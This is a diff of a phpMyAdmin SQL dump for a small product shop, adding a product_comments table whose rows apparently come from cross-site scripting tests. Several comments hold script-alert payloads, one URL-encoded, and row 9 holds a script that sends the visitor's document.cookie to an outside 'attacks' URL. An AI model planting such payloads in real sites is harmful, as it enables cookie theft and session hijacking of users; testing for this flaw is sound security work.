@@ -1,11 +1,11 @@
 -- phpMyAdmin SQL Dump
--- version 4.0.9
+-- version 4.1.8
 -- http://www.phpmyadmin.net
 --
 -- Host: localhost
--- Generation Time: Apr 24, 2014 at 03:27 PM
--- Server version: 5.6.15
--- PHP Version: 5.3.26
+-- Generation Time: May 04, 2014 at 06:35 PM
+-- Server version: 5.6.16
+-- PHP Version: 5.4.24
 
 SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
 SET time_zone = "+00:00";
@@ -59,6 +59,36 @@ INSERT INTO `product` (`id`, `name`, `picurl`, `price`) VALUES
 (18, 'learner guitar', '18.jpg', 116),
 (19, 'casual watch', '19.jpg', 249),
 (20, 'casio watch', '20.jpg', 160);
+
+-- --------------------------------------------------------
+
+--
+-- Table structure for table `product_comments`
+--
+
+CREATE TABLE IF NOT EXISTS `product_comments` (
+  `id` int(10) NOT NULL AUTO_INCREMENT,
+  `productid` int(10) NOT NULL,
+  `email` varchar(100) NOT NULL,
+  `comment` text NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=11 ;
+
+--
+-- Dumping data for table `product_comments`
+--
+
+INSERT INTO `product_comments` (`id`, `productid`, `email`, `comment`) VALUES
+(1, 3, 'df', 'sdf'),
+(2, 8, 'sdf', 'sdf'),
+(3, 8, 'kksd', 'okay buy it now'),
+(4, 11, 'keku', 'meku meku'),
+(5, 11, '', ''),
+(6, 11, 'nana', '%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%68%69%22%29%3C%2F%73%63%72%69%70%74%3E'),
+(7, 11, 'df', '<script>alert("hi")</script>'),
+(8, 11, 'df', '<script>alert("hi")</script>'),
+(9, 3, '', '<script>new Image().src="http://good.site/attacks/showimage.php?param="+document.cookie</script>'),
+(10, 3, '', '');
 
 -- --------------------------------------------------------
 
